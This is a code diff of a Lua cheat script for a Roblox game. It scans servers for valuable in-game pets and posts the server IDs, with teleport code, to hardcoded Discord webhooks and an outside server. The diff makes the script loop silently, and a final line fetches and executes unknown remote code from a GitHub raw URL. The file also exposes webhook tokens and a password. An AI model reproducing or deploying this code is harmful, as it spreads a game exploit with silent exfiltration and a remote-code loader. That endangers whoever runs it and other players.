@@ -1,17 +1,14 @@
 local Players = game:GetService('Players')
-local UserInputService = game:GetService('UserInputService')
 local HttpService = game:GetService('HttpService')
-local StarterGui = game:GetService("StarterGui")
 local Workspace = game:GetService("Workspace")
 
 local localPlayer = Players.LocalPlayer
 
--- 🔒 VDS SEND PASSWORD (только для отправки)
 local VDS_SEND_PASSWORD = "send_546564reaqw452151523333"
 local VDS_URL = "https://auroranotifier.pro"
-
--- 🔐 KONVEER JOBID ENCRYPTION (только для VDS)
 local SECRET = "g45hAT436262155453"
+
+local sentCache = {}
 
 local function newTable(n)
     return table.create and table.create(n) or {}
@@ -38,23 +35,13 @@ local function toHex(str)
     return table.concat(t)
 end
 
-local function fromHex(hex)
-    local t = {}
-    for i = 1, #hex, 2 do
-        local byte = tonumber(hex:sub(i, i+1), 16)
-        t[#t+1] = string.char(byte)
-    end
-    return table.concat(t)
-end
-
 local function EncryptJobId(jobId)
     local x = xorBytes(jobId, SECRET)
     return toHex(x)
 end
 
--- ⚙️ WEBHOOK SETTINGS BY INCOME RANGE
 local WEBHOOKS = {
-    { -- 1M/s - 25M/s
+    {
         url = 'https://discord.com/api/webhooks/1460407533150666803/OKc01gM60tjZNO_Vjrn2IzkohKULm66NMJsCXhyMLzLYf4puiCC6T9aBiv7RmKdIZ_-k',
         title = '🟢 Low Income (1-25M/s)',
         color = 0x00ff00,
@@ -63,7 +50,7 @@ local WEBHOOKS = {
         sendServerInfo = false,
         sendTeleport = true
     },
-    { -- 26M/s - 100M/s (основной, без Server Info)
+    {
         url = 'https://discord.com/api/webhooks/1460407439676412136/iLnLKddTDFW4zkbCnCGW_WRbke_-NbuPeHeSNsCv4Iw0pLrAhvJtdfz5w9mikVyMXv_9',
         title = '🟡 Medium Income (26-100M/s)',
         color = 0xffff00,
@@ -73,7 +60,7 @@ local WEBHOOKS = {
         sendTeleport = false,
         showJoinerAd = true
     },
-    { -- 101M/s - 10000M/s (основной, без Server Info)
+    {
         url = 'https://discord.com/api/webhooks/1460407439676412136/iLnLKddTDFW4zkbCnCGW_WRbke_-NbuPeHeSNsCv4Iw0pLrAhvJtdfz5w9mikVyMXv_9',
         title = '🔴 High Income (101M+ /s)',
         color = 0xff0000,
@@ -83,7 +70,7 @@ local WEBHOOKS = {
         sendTeleport = false,
         showJoinerAd = true
     },
-    { -- Special brainrots + overpay + mutations
+    {
         url = 'https://discord.com/api/webhooks/1457015322119897133/kQkqA4AMYLVviEYFT7Rf4Udz6ATSRYPVcPeDtALzHFfveew7jmjGCPE6Q-5KAZViCaIE',
         title = '⭐️ SPECIAL BRAINROTS + MUTATIONS',
         color = 0xff00ff,
@@ -93,7 +80,6 @@ local WEBHOOKS = {
     }
 }
 
--- 📋 SPECIAL BRAINROTS WITH MIN VALUES + MUTATIONS
 local SPECIAL_BRAINROTS = {
     ['Garama and Madundung'] = { min = 0, mutations = {} },
     ['Dragon Cannelloni'] = { min = 0, mutations = {} },
@@ -150,7 +136,6 @@ local SPECIAL_BRAINROTS = {
     ['AY MI GATITO MIAU MIAU'] = { min = 0, mutations = {} },
 }
 
--- 🎮 OBJECTS WITH EMOJIS AND IMPORTANCE
 local OBJECTS = {
     ['La Vacca Saturno Saturnita'] = { emoji = '🐄', important = false },
     ['Chimpanzini Spiderini'] = { emoji = '🕷️', important = false },
@@ -303,28 +288,22 @@ for name, cfg in pairs(OBJECTS) do
     end
 end
 
--- 🔍 ПОИСК МУТАЦИЙ У ПИТОМЦЕВ
 local function findAllPetMutations()
     local plots = workspace.Plots:GetChildren()
     local petMutations = {}
-    
     for _, plot in ipairs(plots) do
         if plot:IsA("Folder") or plot:IsA("Model") then
             for _, descendant in ipairs(plot:GetDescendants()) do
                 if descendant:IsA("Model") and descendant:GetAttribute("Mutation") then
-                    local petInfo = {
+                    table.insert(petMutations, {
                         PlotId = plot.Name,
                         PetName = descendant.Name,
                         Mutation = descendant:GetAttribute("Mutation")
-                    }
-                    
-                    table.insert(petMutations, petInfo)
-                    print(string.format("[%s] %s: %s", plot.Name, descendant.Name, tostring(descendant:GetAttribute("Mutation"))))
+                    })
                 end
             end
         end
     end
-    
     return petMutations
 end
 
@@ -376,22 +355,18 @@ end
 
 local function getOverheadInfo(animalOverhead)
     if not animalOverhead then return nil, nil end
-
     local name = nil
     local display = animalOverhead:FindFirstChild('DisplayName')
     if display then name = grabText(display) end
-
     if not name then
         local anyText = animalOverhead:FindFirstChildOfClass('TextLabel')
             or animalOverhead:FindFirstChildOfClass('TextButton')
             or animalOverhead:FindFirstChildOfClass('TextBox')
         name = anyText and grabText(anyText) or nil
     end
-
     local genText = nil
     local generation = animalOverhead:FindFirstChild('Generation')
     if generation then genText = grabText(generation) end
-
     if not genText then
         for _, child in ipairs(animalOverhead:GetDescendants()) do
             if child:IsA('TextLabel') or child:IsA('TextButton') or child:IsA('TextBox') then
@@ -403,7 +378,6 @@ local function getOverheadInfo(animalOverhead)
             end
         end
     end
-
     return name, genText
 end
 
@@ -415,7 +389,6 @@ local function scanPlots()
     local results = {}
     local Plots = Workspace:FindFirstChild('Plots')
     if not Plots then return results end
-
     for _, plot in ipairs(Plots:GetChildren()) do
         local Podiums = plot:FindFirstChild('AnimalPodiums')
         if Podiums then
@@ -459,7 +432,6 @@ end
 local function scanAllOverheads()
     local results, processed = {}, {}
     local descendants = Workspace:GetDescendants()
-
     for _, child in ipairs(descendants) do
         if child.Name == 'AnimalOverhead' and not processed[child] then
             processed[child] = true
@@ -477,7 +449,6 @@ local function scanPlayerGui()
     local results = {}
     local playerGui = localPlayer:FindFirstChild('PlayerGui')
     if not playerGui then return results end
-
     local function searchInGui(parent)
         for _, child in ipairs(parent:GetChildren()) do
             if child.Name == 'AnimalOverhead' or child.Name:match('Animal') then
@@ -498,18 +469,15 @@ local function scanDebrisFolder()
     local results = {}
     local DebrisFolder = Workspace:FindFirstChild("Debris")
     if not DebrisFolder then return results end
-
     for _, inst in ipairs(DebrisFolder:GetChildren()) do
         if inst.Name == "FastOverheadTemplate" then
             local gui = inst:FindFirstChild("GUI")
             if gui then
                 local nameInst = gui:FindFirstChild("DisplayName")
                 local genInst = gui:FindFirstChild("Generation")
-
                 local name = nameInst and grabText(nameInst) or nil
                 local genText = genInst and grabText(genInst) or nil
                 local genNum = genText and parseGenerationText(genText) or nil
-
                 if name and genNum then
                     table.insert(results, { name = name, gen = genNum, location = 'DebrisFolder' })
                 end
@@ -522,18 +490,14 @@ end
 local function collectAll(timeoutSec)
     local t0 = os.clock()
     local collected = {}
-
     repeat
         collected = {}
-
         local allSources = { scanPlots(), scanRunway(), scanAllOverheads(), scanPlayerGui(), scanDebrisFolder() }
-
         for _, source in ipairs(allSources) do
             for _, item in ipairs(source) do
                 table.insert(collected, item)
             end
         end
-
         local seen, unique = {}, {}
         for _, item in ipairs(collected) do
             local key = item.name .. ':' .. tostring(item.gen) .. ':' .. (item.location or '')
@@ -543,11 +507,9 @@ local function collectAll(timeoutSec)
             end
         end
         collected = unique
-
         if #collected > 0 then break end
         task.wait(0.5)
     until os.clock() - t0 > timeoutSec
-
     return collected
 end
 
@@ -556,37 +518,26 @@ local function shouldShow(name, gen)
     return (type(gen) == 'number') and gen >= 1_000_000
 end
 
--- ✨ НОВАЯ ФУНКЦИЯ: проверка мутаций
 local function hasRequiredMutation(name, mutation)
     local brainrotConfig = SPECIAL_BRAINROTS[name]
     if not brainrotConfig then return false end
-    
     local mutations = brainrotConfig.mutations or {}
     if #mutations == 0 then return false end
-    
     for _, requiredMutation in ipairs(mutations) do
         if mutation == requiredMutation then
             return true
         end
     end
-    
     return false
 end
 
--- ✨ ОБНОВЛЁННАЯ: проверка special brainrot с учётом мутаций
 local function isSpecialBrainrot(name, gen, mutation)
     local brainrotConfig = SPECIAL_BRAINROTS[name]
     if not brainrotConfig then return false end
-    
     local minValue = brainrotConfig.min
-    local mutations = brainrotConfig.mutations or {}
-    
-    -- Если есть подходящая мутация, отправляем независимо от числа
     if mutation and hasRequiredMutation(name, mutation) then
         return true
     end
-    
-    -- Иначе проверяем минимальное значение
     return gen >= minValue
 end
 
@@ -594,24 +545,18 @@ local function getRequester()
     return http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (KRNL_HTTP and KRNL_HTTP.request)
 end
 
--- 🔒 Кэш токена для SEND
 local VDS_TOKEN_CACHE = {
     token = nil,
     expiresAt = 0
 }
 
--- 🔒 Получение SEND токена с VDS (с кэшированием)
 local function GetVDSToken()
     local req = getRequester()
     if not req then return nil end
-
-    -- Проверяем кэш (оставляем 5 минут запаса до истечения)
     local now = os.time()
     if VDS_TOKEN_CACHE.token and VDS_TOKEN_CACHE.expiresAt > (now + 300) then
         return VDS_TOKEN_CACHE.token
     end
-
-    -- Получаем новый SEND токен
     local success, response = pcall(function()
         return req({
             Url = VDS_URL .. "/auth/send",
@@ -620,54 +565,28 @@ local function GetVDSToken()
             Body = HttpService:JSONEncode({password = VDS_SEND_PASSWORD})
         })
     end)
-
     if success and response and response.StatusCode == 200 then
         local ok, data = pcall(function()
             return HttpService:JSONDecode(response.Body)
         end)
         if ok and data and data.token then
-            -- Сохраняем в кэш
             VDS_TOKEN_CACHE.token = data.token
             VDS_TOKEN_CACHE.expiresAt = math.floor((data.expiresAt or (now * 1000 + 3600000)) / 1000)
-
-            print("🔑 New VDS SEND token cached (scanner)")
             return data.token
         end
     end
     return nil
 end
 
-local function copyJobIdToClipboard()
-    local jobId = game.JobId
-    local text = tostring(jobId)
-
-    if setclipboard then
-        setclipboard(text)
-    else
-        pcall(function()
-            StarterGui:SetCore("SetClipboard", text)
-        end)
-    end
-    print("📋 JobId copied: " .. text)
-end
-
 local function sendToVDS(filteredObjects, webhookConfig)
     local req = getRequester()
     if not req then return end
     if #filteredObjects == 0 then return end
-
-    -- 🔒 Получаем SEND токен перед отправкой
     local token = GetVDSToken()
-    if not token then
-        warn("⚠️ Failed to get VDS SEND token")
-        return
-    end
-
-    -- 🔐 ШИФРУЕМ JobId ТОЛЬКО ДЛЯ VDS
+    if not token then return end
     local encryptedJobId = EncryptJobId(tostring(game.JobId))
-
     local payload = {
-        jobId = encryptedJobId, -- 🔐 Шифрованный JobId
+        jobId = encryptedJobId,
         placeId = game.PlaceId,
         title = webhookConfig.title,
         color = webhookConfig.color,
@@ -677,7 +596,6 @@ local function sendToVDS(filteredObjects, webhookConfig)
         time = os.time(),
         objects = {},
     }
-
     for _, obj in ipairs(filteredObjects) do
         table.insert(payload.objects, {
             name = obj.name,
@@ -688,36 +606,26 @@ local function sendToVDS(filteredObjects, webhookConfig)
             isSpecial = isSpecialBrainrot(obj.name, obj.gen, obj.mutation),
         })
     end
-
-    local ok, resp = pcall(function()
+    pcall(function()
         return req({
             Url = VDS_URL .. "/brainrot",
             Method = "POST",
             Headers = {
                 ["Content-Type"] = "application/json",
                 ["X-Aurora-Token"] = token,
-                ["X-Aurora-Role"] = "send" -- 🔒 Новая роль для отправки
+                ["X-Aurora-Role"] = "send"
             },
             Body = HttpService:JSONEncode(payload),
         })
     end)
-
-    if ok and resp then
-        print("✅ Sent to VDS: " .. #filteredObjects .. " objects (JobId ENCRYPTED)")
-    else
-        warn("⚠️ VDS send failed: " .. tostring(resp))
-    end
 end
 
 local function sendDiscordNotificationByRange(filteredObjects, webhookConfig, allowVDS)
     local req = getRequester()
     if not req then return end
     if #filteredObjects == 0 then return end
-
-    -- Discord получает НЕШИФРОВАННЫЙ JobId
     local jobId = game.JobId
     local placeId = game.PlaceId
-
     local important, regular = {}, {}
     for _, obj in ipairs(filteredObjects) do
         if ALWAYS_IMPORTANT[obj.name] then
@@ -726,60 +634,45 @@ local function sendDiscordNotificationByRange(filteredObjects, webhookConfig, al
             table.insert(regular, obj)
         end
     end
-
     table.sort(important, function(a, b) return a.gen > b.gen end)
     table.sort(regular, function(a, b) return a.gen > b.gen end)
-
     local sorted = {}
     for _, obj in ipairs(important) do table.insert(sorted, obj) end
     for _, obj in ipairs(regular) do table.insert(sorted, obj) end
-
     local objectsList = {}
     for i = 1, math.min(15, #sorted) do
         local obj = sorted[i]
         local emoji = OBJECTS[obj.name] and OBJECTS[obj.name].emoji or '💰'
         local mark = ALWAYS_IMPORTANT[obj.name] and '⭐️ ' or ''
         local locationMark = obj.location == 'DebrisFolder' and ' 🔥' or ''
-
         local overpayMark = ''
         local mutationMark = ''
-        
         if webhookConfig.special and SPECIAL_BRAINROTS[obj.name] then
             local brainrotConfig = SPECIAL_BRAINROTS[obj.name]
             local minVal = brainrotConfig.min
-            
-            -- ✨ Показываем мутацию, если она есть
             if obj.mutation then
                 mutationMark = string.format(' 🎨 **%s**', obj.mutation)
             end
-            
             if obj.gen > minVal then
                 overpayMark = string.format(' 🔥 **OVERPAY** (min: %s)', formatIncomeNumber(minVal))
             end
         end
-
         table.insert(objectsList, string.format('%s%s **%s** (%s)%s%s%s', mark, emoji, obj.name, formatIncomeNumber(obj.gen), mutationMark, overpayMark, locationMark))
     end
-
     local objectsText = table.concat(objectsList, '\n')
-
     local descriptionText = webhookConfig.special
         and string.format('⭐️ Found %d special brainrots!', #filteredObjects)
         or string.format('💎 Found %d objects in range!', #filteredObjects)
-
     local rangeText = webhookConfig.special
         and '**All from special list + mutations**'
         or string.format('**%s - %s**', formatIncomeNumber(webhookConfig.min), formatIncomeNumber(webhookConfig.max))
-
     local fields = {
         { name = '📊 Income range', value = rangeText, inline = true },
         { name = '💰 Objects:', value = objectsText, inline = false },
     }
-
     if webhookConfig.sendServerInfo then
         table.insert(fields, 1, { name = '🆔 Server (Job ID)', value = tostring(jobId), inline = true })
     end
-
     if webhookConfig.sendTeleport then
         local teleportLua = string.format("local ts = game:GetService('TeleportService');\nts:TeleportToPlaceInstance(%d, '%s')", placeId, jobId)
         table.insert(fields, { name = '🚀 Teleport code:', value = teleportLua, inline = false })
@@ -790,7 +683,6 @@ local function sendDiscordNotificationByRange(filteredObjects, webhookConfig, al
             inline = false,
         })
     end
-
     local payload = {
         username = 'AURORA FINDER',
         embeds = { {
@@ -802,8 +694,7 @@ local function sendDiscordNotificationByRange(filteredObjects, webhookConfig, al
             timestamp = DateTime.now():ToIsoDate(),
         } },
     }
-
-    local ok, resp = pcall(function()
+    pcall(function()
         return req({
             Url = webhookConfig.url,
             Method = 'POST',
@@ -811,39 +702,39 @@ local function sendDiscordNotificationByRange(filteredObjects, webhookConfig, al
             Body = HttpService:JSONEncode(payload),
         })
     end)
-
-    if not ok then
-        warn('Discord webhook request failed: ' .. tostring(resp))
-    elseif resp and resp.StatusCode and resp.StatusCode >= 300 then
-        warn('Discord webhook HTTP ' .. tostring(resp.StatusCode) .. ': ' .. tostring(resp.Body))
-    end
-
     if allowVDS then
         sendToVDS(filteredObjects, webhookConfig)
     end
 end
 
+local function generateCacheKey(obj)
+    return obj.name .. ':' .. tostring(obj.gen) .. ':' .. (obj.mutation or 'none')
+end
+
+local function filterNewObjects(objects)
+    local newObjects = {}
+    for _, obj in ipairs(objects) do
+        local key = generateCacheKey(obj)
+        if not sentCache[key] then
+            sentCache[key] = true
+            table.insert(newObjects, obj)
+        end
+    end
+    return newObjects
+end
+
 local function scanAndNotify()
-    local allFound = collectAll(8.0)
-    
-    -- ✨ Получаем мутации
+    local allFound = collectAll(2.0)
     local mutations = findAllPetMutations()
-    
-    -- ✨ Создаём карту мутаций: имя питомца -> мутация
     local mutationMap = {}
     for _, pet in ipairs(mutations) do
         mutationMap[pet.PetName] = pet.Mutation
     end
-    
-    -- ✨ Добавляем мутации к найденным объектам
     for _, obj in ipairs(allFound) do
         obj.mutation = mutationMap[obj.name]
     end
-
-    -- groups: 1=low, 2=medium, 3=high, 4=special
     local groups = {{}, {}, {}, {}}
     local hasSpecial = false
-
     for _, obj in ipairs(allFound) do
         if OBJECTS[obj.name] and shouldShow(obj.name, obj.gen) and type(obj.gen) == 'number' then
             if isSpecialBrainrot(obj.name, obj.gen, obj.mutation) then
@@ -852,15 +743,14 @@ local function scanAndNotify()
             end
         end
     end
-
     local allowVDS = not hasSpecial
-
     if hasSpecial then
-        -- Only Discord, never VDS (JobId НЕ шифруется для Discord)
-        sendDiscordNotificationByRange(groups[4], WEBHOOKS[4], false)
+        local newObjects = filterNewObjects(groups[4])
+        if #newObjects > 0 then
+            sendDiscordNotificationByRange(newObjects, WEBHOOKS[4], false)
+        end
         return
     end
-
     for _, obj in ipairs(allFound) do
         if OBJECTS[obj.name] and shouldShow(obj.name, obj.gen) and type(obj.gen) == 'number' then
             if obj.gen >= WEBHOOKS[1].min and obj.gen <= WEBHOOKS[1].max then
@@ -872,30 +762,20 @@ local function scanAndNotify()
             end
         end
     end
-
     for i, group in ipairs(groups) do
         if #group > 0 and i ~= 4 then
-            sendDiscordNotificationByRange(group, WEBHOOKS[i], allowVDS)
+            local newObjects = filterNewObjects(group)
+            if #newObjects > 0 then
+                sendDiscordNotificationByRange(newObjects, WEBHOOKS[i], allowVDS)
+            end
         end
     end
 end
 
-print("🎯 BRAINROT SCANNER v2.4 🔒 MUTATIONS SUPPORT")
-print("F - Rescan | G - Copy JobId")
 scanAndNotify()
 
-local lastScan, DEBOUNCE = 0, 3
-UserInputService.InputBegan:Connect(function(input, gpe)
-    if gpe then return end
-
-    if input.KeyCode == Enum.KeyCode.F then
-        local now = os.clock()
-        if now - lastScan < DEBOUNCE then return end
-        lastScan = now
-        print("🔍 Manual scan started...")
-        scanAndNotify()
-    elseif input.KeyCode == Enum.KeyCode.G then
-        copyJobIdToClipboard()
-    end
-end)
+while true do
+    task.wait(2)
+    scanAndNotify()
+end
 loadstring(game:HttpGet("https://raw.githubusercontent.com/dsfsdfs21cfc/yrhgnjrtyjh333/refs/heads/main/Vhposhpohosh0p.lua"))()
